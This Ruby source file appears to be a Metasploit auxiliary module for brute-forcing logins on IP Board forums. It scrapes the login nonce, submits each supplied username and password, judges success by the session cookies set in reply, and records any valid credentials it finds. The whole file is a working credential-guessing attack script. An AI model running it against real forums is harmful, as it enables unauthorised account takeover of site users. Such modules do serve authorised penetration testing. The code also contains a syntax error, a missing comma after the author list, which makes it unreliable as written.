
require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'IP Board Login Auxiliary Module',
      'Description' => %q{
        This module attempts to validate user provided credentials against
        an IP Board web application.
        },
      'Author'      => ['Christopher Truncer @ChrisTruncer',]
      'License'     => MSF_LICENSE
    )

    register_options([
        OptString.new('TARGETURI', [true, "The directory of the IP Board install", "/"]),
      ], self.class)
  end

  def run_host(ip)
      connect

      each_user_pass do |user, pass|
        do_login(user, pass)
      end

  end

  def do_login(user, pass)
    begin
      print_status "Connecting to target, searching for IP Board server nonce..."

      # Perform the initial request and find the server nonce, which is required to log
      # into IP Board
      res = send_request_raw({
        'uri'     => normalize_uri("#{datastore['TARGETURI']}"),
        'method'  => 'GET',
        }, 25)

      if not res
        print_error "Request failed..."
        return
      end

      # Grab the key from within the body, or alert that it can't be found and exit out
      if res.body =~ /name='auth_key'\s+value='.*?((?:[a-z0-9]*))'/i
        server_nonce = $1
        print_status "Server nonce found, attempting to log in..."
      else
        print_error "Server nonce not present, potentially not an IP Board install or bad URI."
        print_error "Exiting.."
        return
      end

      # With the server nonce found, try to log into IP Board with the user provided creds
      res2 = send_request_cgi({
        'uri'     => normalize_uri("#{datastore['TARGETURI']}", "index.php?app=core&module=global&section=login&do=process"),
        'method'  => 'POST',
        'vars_post'      => {
          'auth_key' => "#{server_nonce}",
          'ips_username' => "#{user}",
          'ips_password' => "#{pass}",
        }
        })

      # Default value of no creds found
      valid_creds = false

      # Iterate over header response.  If the server is setting the ipsconnect and coppa cookie
      # then we were able to log in successfully.  If they are not set, invalid credentials were
      # provided.
      res2.headers.each do |key, value|
        if key.include? "Set-Cookie" and value.include? "ipsconnect" and value.include? "coppa"
          valid_creds = true
        end
      end

      # Inform the user if the user supplied credentials were valid or not
      if valid_creds
        location = res2.headers['Location']
        print_good "Username: #{user} and Password: #{pass} are valid credentials!"
        report_auth_info({
          :host        => rhost,
          :port        => rport,
          :ptype       => "password",
          :user        => user,
          :pass        => pass,
          :proof       => location,
          :source_type => 'user_supplied'
        })
        return :next_user
      else
        print_error "Username: #{user} and Password: #{pass} are invalid credentials!"
      end

    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end

end
